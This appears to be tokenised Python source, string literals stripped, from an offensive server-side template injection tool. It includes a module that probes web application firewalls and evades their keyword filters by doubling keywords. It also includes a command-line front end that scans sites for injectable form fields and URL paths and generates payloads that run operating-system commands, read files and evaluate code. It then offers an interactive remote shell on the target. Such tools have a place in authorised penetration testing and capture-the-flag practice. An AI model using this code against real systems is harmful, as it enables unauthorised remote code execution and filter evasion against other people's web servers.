<EOL> while p >= <NUM_LIT> and b [ p + <NUM_LIT> ] != c : <EOL> assert answer [ p ] < p <EOL> p = answer [ p ] <EOL> if c == b [ p + <NUM_LIT> ] : <EOL> answer . append ( p + <NUM_LIT> ) <EOL> else : <EOL> answer . append ( p ) <EOL> return answer <EOL> def kmp ( a : str , b : str ) -> Tuple [ int , Union [ int , None ] ] : <EOL> logger . debug ( "<STR_LIT>" , len ( a ) , len ( b ) ) <EOL> if b == "<STR_LIT>" : <EOL> return <NUM_LIT> , None <EOL> next_p = get_next_p ( b ) <EOL> max_answer , max_answer_pos = <NUM_LIT> , None <EOL> j = - <NUM_LIT> <EOL> for i , c in enumerate ( a ) : <EOL> while j >= <NUM_LIT> and b [ j + <NUM_LIT> ] != c : <EOL> assert next_p [ j ] < j <EOL> j = next_p [ j ] <EOL> if c == b [ j + <NUM_LIT> ] : <EOL> j += <NUM_LIT> <EOL> if j + <NUM_LIT> > max_answer : <EOL> max_answer = j + <NUM_LIT> <EOL> max_answer_pos = i <EOL> if j == len ( b ) - <NUM_LIT> : <EOL> j = - <NUM_LIT> <EOL> logger . debug ( "<STR_LIT>" , i , c , j ) <EOL> return max_answer , max_answer_pos <EOL> def find_pieces ( resp_text , payload ) : <EOL> assert len ( resp_text ) < <NUM_LIT> and len ( payload ) < <NUM_LIT> <EOL> logger . debug ( "<STR_LIT>" , resp_text [ : <NUM_LIT> ] , payload [ : <NUM_LIT> ] ) <EOL> max_answer , max_answer_pos = kmp ( resp_text , payload ) <EOL> logger . debug ( "<STR_LIT>" , max_answer , str ( max_answer_pos ) ) <EOL> if max_answer <= <NUM_LIT> or max_answer_pos is None : <EOL> logger . debug ( "<STR_LIT>" ) <EOL> return [ ] <EOL> resp_text_matched = resp_text [ max_answer_pos - max_answer + <NUM_LIT> : max_answer_pos + <NUM_LIT> ] <EOL> resp_text_unmatched , payload_unmatched = ( <EOL> resp_text [ max_answer_pos + <NUM_LIT> : ] , <EOL> payload [ len ( resp_text_matched ) : ] , <EOL> ) <EOL> if payload_unmatched == "<STR_LIT>" : <EOL> logger . debug ( "<STR_LIT>" ) <EOL> return [ ] <EOL> max_answer_unmatched , max_answer_pos_unmatched = kmp ( <EOL> payload_unmatched , resp_text_unmatched <EOL> ) <EOL> if max_answer_pos_unmatched is None : <EOL> return [ ] <EOL> payload_unmatched_before = payload_unmatched [ <EOL> : max_answer_pos_unmatched - max_answer_unmatched + <NUM_LIT> <EOL> ] <EOL> resp_text_next = removeprefix_string ( resp_text_unmatched , payload_unmatched_before ) <EOL> payload_next = removeprefix_string ( payload_unmatched , payload_unmatched_before ) <EOL> assert len ( resp_text_next ) < len ( resp_text ) and len ( payload_next ) < len ( payload ) <EOL> return [ <EOL> payload_unmatched_before , <EOL> ] + find_pieces ( resp_text_next , payload_next ) <EOL> def combine_waf ( waf_funcs ) : <EOL> def new_waf_func ( s ) : <EOL> return all ( waf ( s ) for waf in waf_funcs ) <EOL> return new_waf_func <EOL> class WafFuncGen : <EOL> def __init__ ( <EOL> self , <EOL> submitter : Submitter , <EOL> callback : Union [ Callable [ [ str , Dict ] , None ] , None ] = None , <EOL> options : Union [ Options , None ] = None , <EOL> ) : <EOL> self . subm = submitter <EOL> self . callback : Callable [ [ str , Dict ] , None ] = ( <EOL> callback if callback else ( lambda x , y : None ) <EOL> ) <EOL> self . options = options if options else Options ( ) <EOL> def waf_page_hash ( self ) : <EOL> test_keywords = ( <EOL> grouped_payloads ( <NUM_LIT> ) + dangerous_keywords <EOL> if self . options . detect_mode == DetectMode . ACCURATE <EOL> else grouped_payloads ( <NUM_LIT> ) <EOL> ) <EOL> hashes : List [ int ] = [ ] <EOL> for keyword in test_keywords : <EOL> logger . info ( <EOL> "<STR_LIT>" , <EOL> colored ( "<STR_LIT>" , repr ( keyword * <NUM_LIT> ) ) , <EOL> ) <EOL> result = self . subm . submit ( keyword * <NUM_LIT> ) <EOL> if result is None : <EOL> logger . info ( <EOL> "<STR_LIT>" , <EOL> colored ( "<STR_LIT>" , "<STR_LIT>" ) , <EOL> colored ( "<STR_LIT>" , repr ( keyword * <NUM_LIT> ) ) , <EOL> ) <EOL> continue <EOL> status_code , text = result <EOL> if status_code == <NUM_LIT> : <EOL> continue <EOL> hashes . append ( hash ( text ) ) <EOL> return [ k for k , v in Counter ( hashes ) . items ( ) if v >= <NUM_LIT> ] <EOL> def long_param_hash ( self ) -> List [ int ] : <EOL> logger . info ( "<STR_LIT>" ) <EOL> keywords = [ <EOL> "<STR_LIT>" . join ( random . choices ( string . ascii_lowercase , k = <NUM_LIT> ) ) * <NUM_LIT> for _ in range ( <NUM_LIT> ) <EOL> ] <EOL> hashes = [ ] <EOL> for keyword in keywords : <EOL> result = self . subm . submit ( keyword ) <EOL> if result is None : <EOL> logger . info ( <EOL> "<STR_LIT>" , <EOL> colored ( "<STR_LIT>" , "<STR_LIT>" ) , <EOL> ) <EOL> continue <EOL> status_code , text = result <EOL> if status_code == <NUM_LIT> : <EOL> continue <EOL> hashes . append ( hash ( text ) ) <EOL> hashes_uniq = list ( set ( hashes ) ) <EOL> if len ( hashes_uniq ) <= <NUM_LIT> : <EOL> logger . warning ( <EOL> "<STR_LIT>" <EOL> + "<STR_LIT>" , <EOL> colored ( "<STR_LIT>" , "<STR_LIT>" , bold = True ) , <EOL> ) <EOL> time . sleep ( <NUM_LIT> ) <EOL> return [ k for k , v in Counter ( hashes ) . items ( ) if v >= <NUM_LIT> ] <EOL> def replaced_keyword ( self ) -> List [ str ] : <EOL> extra = "<STR_LIT>" . join ( random . choices ( string . ascii_lowercase , k = <NUM_LIT> ) ) <EOL> test_payloads = ( <EOL> dangerous_keywords <EOL> if self . options . detect_mode == DetectMode . ACCURATE <EOL> else grouped_payloads ( <NUM_LIT> , sep = extra ) <EOL> ) <EOL> keywords = [ ] <EOL> for keyword in test_payloads : <EOL> while extra [ <NUM_LIT> ] == keyword [ <NUM_LIT> ] or extra [ - <NUM_LIT> ] == keyword [ - <NUM_LIT> ] : <EOL> extra = "<STR_LIT>" . join ( random . choices ( string . ascii_lowercase , k = <NUM_LIT> ) ) <EOL> payload = extra + keyword + extra <EOL> logger . info ( <EOL> "<STR_LIT>" , <EOL> colored ( "<STR_LIT>" , repr ( payload ) ) , <EOL> ) <EOL> result = self . subm . submit ( payload ) <EOL> if result is None : <EOL> logger . info ( <EOL> "<STR_LIT>" , <EOL> colored ( "<STR_LIT>" , "<STR_LIT>" ) , <EOL> colored ( "<STR_LIT>" , repr ( payload ) ) , <EOL> ) <EOL> continue <EOL> status_code , text = result <EOL> if status_code == <NUM_LIT> : <EOL> continue <EOL> if len ( text ) > <NUM_LIT> : <EOL> continue <EOL> try : <EOL> payload_replaced_keyword = find_pieces ( text , payload ) <EOL> except Exception : <EOL> traceback . print_exc ( ) <EOL> continue <EOL> if payload_replaced_keyword : <EOL> payload_replaced_keyword = list ( set ( payload_replaced_keyword ) ) <EOL> if len ( payload_replaced_keyword ) > <NUM_LIT> : <EOL> logger . info ( <EOL> "<STR_LIT>" , <EOL> len ( payload_replaced_keyword ) , <EOL> ) <EOL> else : <EOL> keywords += payload_replaced_keyword <EOL> if keyword not in text and extra in text : <EOL> keywords . append ( keyword ) <EOL> keywords = list ( set ( keywords ) ) <EOL> if keywords : <EOL> logger . info ( <EOL> "<STR_LIT>" , <EOL> colored ( "<STR_LIT>" , "<STR_LIT>" , bold = True ) , <EOL> colored ( "<STR_LIT>" , repr ( keywords ) ) , <EOL> ) <EOL> return keywords <EOL> def doubletapping ( self , payload : str , keywords : List [ str ] ) : <EOL> if not keywords : <EOL> return payload <EOL> logger . info ( <EOL> "<STR_LIT>" , <EOL> colored ( "<STR_LIT>" , "<STR_LIT>" ) , <EOL> colored ( "<STR_LIT>" , payload ) , <EOL> ) <EOL> exist_keywords = [ w for w in keywords if w in payload ] <EOL> replacement = { <EOL> w : w [ : len ( w ) // <NUM_LIT> ] + w + w [ len ( w ) // <NUM_LIT> : ] <EOL> for w in exist_keywords <EOL> if len ( w ) >= <NUM_LIT> <EOL> } <EOL> for k , v in sorted ( replacement . items ( ) , key = lambda item : len ( item [ <NUM_LIT> ] ) ) : <EOL> payload = payload . replace ( k , v ) <EOL> return payload <EOL> def generate ( self ) -> WafFunc : <EOL> replaced_keyword = self . replaced_keyword ( ) <EOL> waf_hashes = self . waf_page_hash ( ) <EOL> long_param_hashes = self . long_param_hash ( ) <EOL> long_param_hashes = [ h for h in long_param_hashes if h not in waf_hashes ] <EOL> if ( <EOL> self . options . replaced_keyword_strategy <EOL> == ReplacedKeywordStrategy . DOUBLETAPPING <EOL> ) : <EOL> self . subm . add_tamperer ( lambda s : self . doubletapping ( s , replaced_keyword ) ) <EOL> extra_content , extra_passed = ( <EOL> "<STR_LIT>" . join ( random . choices ( string . ascii_lowercase , k = <NUM_LIT> ) ) , <EOL> False , <EOL> ) <EOL> @ lru_cache ( <NUM_LIT> ) <EOL> def waf_func ( value ) : <EOL> nonlocal extra_content , extra_passed , replaced_keyword <EOL> payload = extra_content + value <EOL> for _ in range ( <NUM_LIT> ) : <EOL> if ( <EOL> self . options . replaced_keyword_strategy <EOL> == ReplacedKeywordStrategy . AVOID <EOL> and any ( w in payload for w in replaced_keyword ) <EOL> ) : <EOL> logger . debug ( "<STR_LIT>" ) <EOL> return False <EOL> result = self . subm . submit ( payload ) <EOL> if result is None : <EOL> logger . debug ( "<STR_LIT>" ) <EOL> return False <EOL> if result . status_code == <NUM_LIT> : <EOL> logger . debug ( "<STR_LIT>" ) <EOL> return any ( w in result . text for w in render_error_keywords ) <EOL> hash_text = hash ( result . text ) <EOL> if hash_text in long_param_hashes : <EOL> logger . debug ( "<STR_LIT>" ) <EOL> return False <EOL> if ( <EOL> re . match ( r"<STR_LIT>" , payload ) <EOL> and payload not in result . text <EOL> ) : <EOL> logger . debug ( <EOL> "<STR_LIT>" , colored ( "<STR_LIT>" , payload ) <EOL> ) <EOL> return False <EOL> if extra_content in result . text : <EOL> logger . debug ( "<STR_LIT>" ) <EOL> return True <EOL> replaced_list = find_pieces ( result . text , payload ) <EOL> if replaced_list : <EOL> logger . debug ( <EOL> "<STR_LIT>" , <EOL> colored ( "<STR_LIT>" , repr ( replaced_list ) ) , <EOL> ) <EOL> replaced_keyword += replaced_list <EOL> return ( <EOL> self . options . replaced_keyword_strategy <EOL> == ReplacedKeywordStrategy . IGNORE <EOL> ) <EOL> if self . options . detect_mode == DetectMode . FAST : <EOL> logger . debug ( "<STR_LIT>" ) <EOL> return False <EOL> if extra_passed : <EOL> logger . debug ( "<STR_LIT>" ) <EOL> return False <EOL> extra_content_result = self . subm . submit ( extra_content ) <EOL> if extra_content_result is None : <EOL> continue <EOL> if ( <EOL> extra_content_result . status_code != <NUM_LIT> <EOL> and hash ( extra_content_result . text ) in waf_hashes <EOL> ) : <EOL> logger . debug ( "<STR_LIT>" ) <EOL> extra_content = "<STR_LIT>" . join ( random . choices ( string . ascii_lowercase , k = <NUM_LIT> ) ) <EOL> continue <EOL> extra_passed = True <EOL> logger . debug ( "<STR_LIT>" ) <EOL> return False <EOL> return False <EOL> return waf_func <EOL> </s>
<s> import logging <EOL> import time <EOL> from urllib . parse import urlparse <EOL> from typing import List , Dict , Tuple , Union , Any <EOL> from enum import Enum <EOL> from functools import partial <EOL> from pathlib import Path <EOL> import click <EOL> from . const import ( <EOL> DetectMode , <EOL> TemplateEnvironment , <EOL> PythonEnvironment , <EOL> ReplacedKeywordStrategy , <EOL> OS_POPEN_READ , <EOL> CONFIG , <EOL> EVAL , <EOL> STRING , <EOL> DEFAULT_USER_AGENT , <EOL> ) <EOL> from . colorize import colored , set_enable_coloring <EOL> from . cracker import Cracker , EvalArgsModePayloadGen , guess_python_version <EOL> from . form import Form , get_form <EOL> from . full_payload_gen import FullPayloadGen <EOL> from . requester import ( <EOL> HTTPRequester , <EOL> TCPRequester , <EOL> check_line_break , <EOL> fix_line_break , <EOL> check_tail , <EOL> fix_tail , <EOL> ) <EOL> from . submitter import ( <EOL> Submitter , <EOL> PathSubmitter , <EOL> FormSubmitter , <EOL> TCPSubmitter , <EOL> shell_tamperer , <EOL> ) <EOL> from . scan_url import yield_form <EOL> from . webui import main as webui_main <EOL> from . interact import interact <EOL> from . options import Options <EOL> set_enable_coloring ( ) <EOL> TITLE = colored ( <EOL> "<STR_LIT>" , <EOL> . strip ( <EOL> "<STR_LIT>" <EOL> ) , <EOL> bold = True , <EOL> ) <EOL> LOGGING_FORMAT = "<STR_LIT>" <EOL> logging . basicConfig ( level = logging . INFO , format = LOGGING_FORMAT ) <EOL> logger = logging . getLogger ( "<STR_LIT>" ) <EOL> class EnumOption ( click . Option ) : <EOL> def type_cast_value ( self , ctx : click . Context , value : Any ) : <EOL> if not isinstance ( self . type , click . types . FuncParamType ) : <EOL> raise RuntimeError ( "<STR_LIT>" ) <EOL> clazz : type = self . type . func <EOL> if not issubclass ( clazz , Enum ) : <EOL> raise RuntimeError ( "<STR_LIT>" ) <EOL> try : <EOL> _ = self . type ( value ) <EOL> except Exception as exc : <EOL> raise click . exceptions . BadParameter ( <EOL> f"<STR_LIT>" , <EOL> ctx = ctx , <EOL> param = self , <EOL> ) from exc <EOL> return super ( ) . type_cast_value ( ctx , value ) <EOL> class RunFailed ( Exception ) : <EOL> def do_submit_cmdexec ( <EOL> cmd : str , <EOL> submitter : Submitter , <EOL> full_payload_gen_like : Union [ FullPayloadGen , EvalArgsModePayloadGen ] , <EOL> ) -> str : <EOL> payload , will_print = None , None <EOL> if cmd [ <NUM_LIT> ] == "<STR_LIT>" : <EOL> cmd = cmd [ <NUM_LIT> : ] <EOL> if cmd . startswith ( "<STR_LIT>" ) : <EOL> payload , will_print = full_payload_gen_like . generate ( CONFIG ) <EOL> elif cmd . startswith ( "<STR_LIT>" ) : <EOL> payload , will_print = full_payload_gen_like . generate ( <EOL> EVAL , ( STRING , cmd [ <NUM_LIT> : ] . strip ( ) ) <EOL> ) <EOL> elif cmd . startswith ( "<STR_LIT>" ) : <EOL> cmd = cmd . strip ( ) <EOL> if len ( cmd ) == <NUM_LIT> : <EOL> payload , will_print = full_payload_gen_like . generate ( <EOL> EVAL , ( STRING , "<STR_LIT>" ) <EOL> ) <EOL> else : <EOL> payload , will_print = full_payload_gen_like . generate ( <EOL> EVAL , ( STRING , f"<STR_LIT>" ) <EOL> ) <EOL> elif cmd . startswith ( "<STR_LIT>" ) : <EOL> filepath = cmd [ <NUM_LIT> : ] . strip ( ) <EOL> payload , will_print = full_payload_gen_like . generate ( <EOL> EVAL , ( STRING , f"<STR_LIT>" ) <EOL> ) <EOL> elif cmd . startswith ( "<STR_LIT>" ) : <EOL> statements = cmd [ <NUM_LIT> : ] . strip ( ) <EOL> payload , will_print = full_payload_gen_like . generate ( <EOL> EVAL , ( STRING , f"<STR_LIT>" ) <EOL> ) <EOL> else : <EOL> logging . warning ( "<STR_LIT>" ) <EOL> return "<STR_LIT>" <EOL> else : <EOL> payload , will_print = full_payload_gen_like . generate ( OS_POPEN_READ , cmd ) <EOL> if payload is None : <EOL> logger . warning ( "<STR_LIT>" , colored ( "<STR_LIT>" , "<STR_LIT>" ) ) <EOL> return "<STR_LIT>" <EOL> logger . info ( "<STR_LIT>" , colored ( "<STR_LIT>" , payload ) ) <EOL> if not will_print : <EOL> payload_wont_print = ( <EOL> "<STR_LIT>" <EOL> ) <EOL> logger . warning ( payload_wont_print , colored ( "<STR_LIT>" , "<STR_LIT>" ) ) <EOL> result = submitter . submit ( payload ) <EOL> assert result is not None <EOL> return result . text <EOL> def parse_headers_cookies ( headers_list : List [ str ] , cookies : str ) -> Dict [ str , str ] : <EOL> headers = { } <EOL> if headers_list : <EOL> for header in headers_list : <EOL> key , _ , value = header . partition ( "<STR_LIT>" ) <EOL> if not key or not value : <EOL> logger . warning ( "<STR_LIT>" , repr ( header ) ) <EOL> continue <EOL> if key . capitalize ( ) != key : <EOL> logger . warning ( "<STR_LIT>" , key ) <EOL> key = key . capitalize ( ) <EOL> headers [ key ] = value <EOL> if cookies : <EOL> headers [ "<STR_LIT>" ] = cookies <EOL> return headers <EOL> def do_crack_form_pre ( <EOL> url : str , <EOL> form : Form , <EOL> requester : HTTPRequester , <EOL> detect_mode : DetectMode , <EOL> replaced_keyword_strategy : ReplacedKeywordStrategy , <EOL> environment : TemplateEnvironment , <EOL> tamper_cmd : Union [ str , None ] , <EOL> ) -> Union [ Tuple [ FullPayloadGen , Submitter ] , None ] : <EOL> python_version = guess_python_version ( url , requester ) <EOL> for input_field in form [ "<STR_LIT>" ] : <EOL> submitter = FormSubmitter ( <EOL> url , <EOL> form , <EOL> input_field , <EOL> requester , <EOL> ) <EOL> if tamper_cmd : <EOL> tamperer = shell_tamperer ( tamper_cmd ) <EOL> submitter . add_tamperer ( tamperer ) <EOL> options = Options ( <EOL> detect_mode = detect_mode , <EOL> replaced_keyword_strategy = replaced_keyword_strategy , <EOL> environment = environment , <EOL> python_version = python_version , <EOL> ) <EOL> cracker = Cracker ( submitter = submitter , options = options ) <EOL> if not cracker . has_respond ( ) : <EOL> return None <EOL> full_payload_gen = cracker . crack ( ) <EOL> if full_payload_gen : <EOL> return full_payload_gen , submitter <EOL> return None <EOL> def do_crack_form_eval_args_pre ( <EOL> url : str , <EOL> form : Form , <EOL> requester : HTTPRequester , <EOL> detect_mode : DetectMode , <EOL> replaced_keyword_strategy : ReplacedKeywordStrategy , <EOL> environment : TemplateEnvironment , <EOL> tamper_cmd : Union [ str , None ] , <EOL> ) -> Union [ Tuple [ Submitter , EvalArgsModePayloadGen ] , None ] : <EOL> python_version = guess_python_version ( url , requester ) <EOL> for input_field in form [ "<STR_LIT>" ] : <EOL> submitter = FormSubmitter ( <EOL> url , <EOL> form , <EOL> input_field , <EOL> requester , <EOL> ) <EOL> if tamper_cmd : <EOL> tamperer = shell_tamperer ( tamper_cmd ) <EOL> submitter . add_tamperer ( tamperer ) <EOL> options = Options ( <EOL> detect_mode = detect_mode , <EOL> replaced_keyword_strategy = replaced_keyword_strategy , <EOL> environment = environment , <EOL> python_version = python_version , <EOL> ) <EOL> cracker = Cracker ( submitter = submitter , options = options ) <EOL> if not cracker . has_respond ( ) : <EOL> return None <EOL> result = cracker . crack_eval_args ( ) <EOL> if result : <EOL> submitter , evalargs_payload_gen = result <EOL> return submitter , evalargs_payload_gen <EOL> return None <EOL> def do_crack_path_pre ( <EOL> url : str , <EOL> requester : HTTPRequester , <EOL> detect_mode : DetectMode , <EOL> replaced_keyword_strategy : ReplacedKeywordStrategy , <EOL> environment : TemplateEnvironment , <EOL> tamper_cmd : Union [ str , None ] , <EOL> ) -> Union [ Tuple [ FullPayloadGen , Submitter ] , None ] : <EOL> python_version = guess_python_version ( url , requester ) <EOL> submitter = PathSubmitter ( url = url , requester = requester ) <EOL> if tamper_cmd : <EOL> tamperer = shell_tamperer ( tamper_cmd ) <EOL> submitter . add_tamperer ( tamperer ) <EOL> options = Options ( <EOL> detect_mode = detect_mode , <EOL> replaced_keyword_strategy = replaced_keyword_strategy , <EOL> environment = environment , <EOL> python_version = python_version , <EOL> ) <EOL> cracker = Cracker ( submitter = submitter , options = options ) <EOL> if not cracker . has_respond ( ) : <EOL> return None <EOL> full_payload_gen = cracker . crack ( ) <EOL> if full_payload_gen is None : <EOL> return None <EOL> return full_payload_gen , submitter <EOL> def do_crack_request_pre ( <EOL> submitter : TCPSubmitter , <EOL> detect_mode : DetectMode , <EOL> replaced_keyword_strategy : ReplacedKeywordStrategy , <EOL> environment : TemplateEnvironment , <EOL> ) -> Union [ FullPayloadGen , None ] : <EOL> options = Options ( <EOL> detect_mode = detect_mode , <EOL> replaced_keyword_strategy = replaced_keyword_strategy , <EOL> environment = environment , <EOL> python_version = PythonEnvironment . UNKNOWN , <EOL> ) <EOL> cracker = Cracker ( submitter = submitter , options = options ) <EOL> if not cracker . has_respond ( ) : <EOL> return None <EOL> full_payload_gen = cracker . crack ( ) <EOL> if full_payload_gen is None : <EOL> return None <EOL> return full_payload_gen <EOL> def do_crack ( <EOL> full_payload_gen : FullPayloadGen , submitter : Submitter , exec_cmd : Union [ str , None ] <EOL> ) : <EOL> cmd_exec_func = partial ( <EOL> do_submit_cmdexec , <EOL> submitter = submitter , <EOL> full_payload_gen_like = full_payload_gen , <EOL> ) <EOL> if exec_cmd : <EOL> print ( cmd_exec_func ( exec_cmd ) ) <EOL> else : <EOL> interact ( cmd_exec_func ) <EOL> def do_crack_eval_args ( <EOL> submitter : Submitter , <EOL> eval_args_payloadgen : EvalArgsModePayloadGen , <EOL> exec_cmd : Union [ str , None ] , <EOL> ) : <EOL> cmd_exec_func = partial ( <EOL> do_submit_cmdexec , <EOL> submitter = submitter , <EOL> full_payload_gen_like = eval_args_payloadgen , <EOL> ) <EOL> if exec_cmd : <EOL> print ( cmd_exec_func ( exec_cmd ) ) <EOL> else : <EOL> interact ( cmd_exec_func ) <EOL> common_options_cli = [ <EOL> click . option ( <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> default = "<STR_LIT>" , <EOL> help = "<STR_LIT>" , <EOL> ) , <EOL> click . option ( <EOL> "<STR_LIT>" , <EOL> type = DetectMode , <EOL> cls = EnumOption , <EOL> default = DetectMode . ACCURATE , <EOL> help = "<STR_LIT>" , <EOL> ) , <EOL> click . option ( <EOL> "<STR_LIT>" , <EOL> default = ReplacedKeywordStrategy . AVOID , <EOL> type = ReplacedKeywordStrategy , <EOL> cls = EnumOption , <EOL> help = "<STR_LIT>" , <EOL> ) , <EOL> click . option ( <EOL> "<STR_LIT>" , <EOL> default = TemplateEnvironment . JINJA2 , <EOL> type = TemplateEnvironment , <EOL> cls = EnumOption , <EOL> help = "<STR_LIT>" , <EOL> ) , <EOL> click . option ( <EOL> "<STR_LIT>" , <EOL> default = "<STR_LIT>" , <EOL> help = "<STR_LIT>" , <EOL> ) , <EOL> click . option ( "<STR_LIT>" , default = <NUM_LIT> , help = "<STR_LIT>" ) , <EOL> ] <EOL> common_options_http = [ <EOL> click . option ( "<STR_LIT>" , "<STR_LIT>" , required = True , help = "<STR_LIT>" ) , <EOL> click . option ( <EOL> "<STR_LIT>" , default = DEFAULT_USER_AGENT , help = "<STR_LIT>" <EOL> ) , <EOL> click . option ( "<STR_LIT>" , default = [ ] , multiple = True , help = "<STR_LIT>" ) , <EOL> click . option ( "<STR_LIT>" , default = "<STR_LIT>" , help = "<STR_LIT>" ) , <EOL> click . option ( "<STR_LIT>" , default = None , help = "<STR_LIT>" ) , <EOL> click . option ( "<STR_LIT>" , default = None , help = "<STR_LIT>" ) , <EOL> click . option ( "<STR_LIT>" , default = "<STR_LIT>" , help = "<STR_LIT>" ) , <EOL> ] <EOL> def add_options ( options ) : <EOL> def decorator ( f ) : <EOL> for option in options : <EOL> f = option ( f ) <EOL> return f <EOL> return decorator <EOL> @ click . group ( ) <EOL> def main ( ) : <EOL> @ main . command ( ) <EOL> @ add_options ( common_options_http ) <EOL> @ add_options ( common_options_cli ) <EOL> @ click . option ( <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> default = None , <EOL> help = "<STR_LIT>" , <EOL> ) <EOL> @ click . option ( "<STR_LIT>" , "<STR_LIT>" , default = "<STR_LIT>" , help = "<STR_LIT>" ) <EOL> @ click . option ( "<STR_LIT>" , "<STR_LIT>" , required = True , help = "<STR_LIT>" ) <EOL> @ click . option ( <EOL> "<STR_LIT>" , <EOL> default = False , <EOL> is_flag = True , <EOL> help = "<STR_LIT>" , <EOL> ) <EOL> def crack ( <EOL> url : str , <EOL> action : str , <EOL> method : str , <EOL> inputs : str , <EOL> exec_cmd : str , <EOL> interval : float , <EOL> detect_mode : DetectMode , <EOL> replaced_keyword_strategy : ReplacedKeywordStrategy , <EOL> environment : TemplateEnvironment , <EOL> eval_args_payload : bool , <EOL> user_agent : str , <EOL> header : tuple , <EOL> cookies : str , <EOL> extra_params : str , <EOL> extra_data : str , <EOL> proxy : str , <EOL> tamper_cmd : str , <EOL> ) : <EOL> print ( TITLE ) <EOL> assert all ( param is not None for param in [ url , inputs ] ) , "<STR_LIT>" <EOL> form = get_form ( <EOL> action = action or urlparse ( url ) . path , <EOL> method = method , <EOL> inputs = inputs . split ( "<STR_LIT>" ) , <EOL> ) <EOL> requester = HTTPRequester ( <EOL> interval = interval , <EOL> user_agent = user_agent , <EOL> headers = parse_headers_cookies ( headers_list = list ( header ) , cookies = cookies ) , <EOL> extra_params_querystr = extra_params , <EOL> extra_data_querystr = extra_data , <EOL> proxy = proxy , <EOL> ) <EOL> if not eval_args_payload : <EOL> result = do_crack_form_pre ( <EOL> url , <EOL> form , <EOL> requester , <EOL> detect_mode , <EOL> replaced_keyword_strategy , <EOL> environment , <EOL> tamper_cmd , <EOL> ) <EOL> if not result : <EOL> logger . warning ( "<STR_LIT>" ) <EOL> raise RunFailed ( ) <EOL> full_payload_gen , submitter = result <EOL> do_crack ( full_payload_gen , submitter , exec_cmd ) <EOL> else : <EOL> result = do_crack_form_eval_args_pre ( <EOL> url , <EOL> form , <EOL> requester , <EOL> detect_mode , <EOL> replaced_keyword_strategy , <EOL> environment , <EOL> tamper_cmd , <EOL> ) <EOL> if not result : <EOL> logger . warning ( "<STR_LIT>" ) <EOL> raise RunFailed ( ) <EOL> submitter , evalargs_payload_gen = result <EOL> do_crack_eval_args ( submitter , evalargs_payload_gen , exec_cmd ) <EOL> @ main . command ( ) <EOL> @ add_options ( common_options_http ) <EOL> @ add_options ( common_options_cli ) <EOL> def crack_path ( <EOL> url : str , <EOL> exec_cmd : str , <EOL> interval : float , <EOL> detect_mode : DetectMode , <EOL> replaced_keyword_strategy : ReplacedKeywordStrategy , <EOL> environment : TemplateEnvironment , <EOL> user_agent : str , <EOL> header : tuple , <EOL> cookies : str , <EOL> extra_params : str , <EOL> extra_data : str , <EOL> proxy : str , <EOL> tamper_cmd : str , <EOL> ) : <EOL> assert url is not None , "<STR_LIT>" <EOL> print ( TITLE ) <EOL> requester = HTTPRequester ( <EOL> interval = interval , <EOL> user_agent = user_agent , <EOL> headers = parse_headers_cookies ( headers_list = list ( header ) , cookies = cookies ) , <EOL> extra_params_querystr = extra_params , <EOL> extra_data_querystr = extra_data , <EOL> proxy = proxy , <EOL> ) <EOL> result = do_crack_path_pre ( <EOL> url , <EOL> requester , <EOL> detect_mode , <EOL> replaced_keyword_strategy , <EOL> environment , <EOL> tamper_cmd , <EOL> ) <EOL> if not result : <EOL> logger . warning ( "<STR_LIT>" ) <EOL> raise RunFailed ( ) <EOL> full_payload_gen , submitter = result <EOL> do_crack ( full_payload_gen , submitter , exec_cmd ) <EOL> @ main . command ( ) <EOL> @ add_options ( common_options_http ) <EOL> @ add_options ( common_options_cli ) <EOL> def scan ( <EOL> url , <EOL> exec_cmd , <EOL> interval , <EOL> detect_mode , <EOL> replaced_keyword_strategy , <EOL> environment , <EOL> user_agent , <EOL> header , <EOL> cookies , <EOL> extra_params , <EOL> extra_data , <EOL> proxy , <EOL> tamper_cmd : str , <EOL> ) : <EOL> print ( TITLE ) <EOL> requester = HTTPRequester ( <EOL> interval = interval , <EOL> user_agent = user_agent , <EOL> headers = parse_headers_cookies ( headers_list = list ( header ) , cookies = cookies ) , <EOL> extra_params_querystr = extra_params , <EOL> extra_data_querystr = extra_data , <EOL> proxy = proxy , <EOL> ) <EOL> url_forms = ( <EOL> ( page_url , form ) <EOL> for ( page_url , forms ) in yield_form ( requester , url ) <EOL> for form in forms <EOL> ) <EOL> for page_url , form in url_forms : <EOL> logger . warning ( "<STR_LIT>" , colored ( "<STR_LIT>" , repr ( form ) ) ) <EOL> result = do_crack_form_pre ( <EOL> page_url , <EOL> form , <EOL> requester , <EOL> detect_mode , <EOL> replaced_keyword_strategy , <EOL> environment , <EOL> tamper_cmd , <EOL> ) <EOL> if not result : <EOL> continue <EOL> full_payload_gen , submitter = result <EOL> do_crack ( full_payload_gen , submitter , exec_cmd ) <EOL> return <EOL> logger . warning ( "<STR_LIT>" ) <EOL> logger . warning ( <EOL> "<STR_LIT>" <EOL> + "<STR_LIT>" , <EOL> url , <EOL> ) <EOL> raise RunFailed ( ) <EOL> @ main . command ( ) <EOL> @ add_options ( common_options_cli ) <EOL> @ click . option ( "<STR_LIT>" , "<STR_LIT>" , required = True , help = "<STR_LIT>" ) <EOL> @ click . option ( "<STR_LIT>" , "<STR_LIT>" , required = True , type = int , help = "<STR_LIT>" ) <EOL> @ click . option ( <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> required = True , <EOL> help = "<STR_LIT>" , <EOL> ) <EOL> @ click . option ( <EOL> "<STR_LIT>" , default = b"<STR_LIT>" , type = bytes , help = "<STR_LIT>" <EOL> ) <EOL> @ click . option ( "<STR_LIT>" , default = False , help = "<STR_LIT>" ) <EOL> @ click . option ( "<STR_LIT>" , default = True , help = "<STR_LIT>" ) <EOL> @ click . option ( "<STR_LIT>" , is_flag = True , default = False , help = "<STR_LIT>" ) <EOL> @ click . option ( "<STR_LIT>" , default = <NUM_LIT> , help = "<STR_LIT>" ) <EOL> def crack_request ( <EOL> host : str , <EOL> port : int , <EOL> request_file : str , <EOL> toreplace : bytes , <EOL> ssl : bool , <EOL> exec_cmd : str , <EOL> urlencode_payload : bool , <EOL> raw : bool , <EOL> detect_mode : DetectMode , <EOL> replaced_keyword_strategy : ReplacedKeywordStrategy , <EOL> environment : TemplateEnvironment , <EOL> retry_times : int , <EOL> interval : float , <EOL> tamper_cmd : str , <EOL> ) : <EOL> request_filepath = Path ( request_file ) <EOL> if not request_filepath . is_file ( ) : <EOL> logger . error ( "<STR_LIT>" , request_filepath ) <EOL> request_pattern = request_filepath . read_bytes ( ) <EOL> if not raw and not check_tail 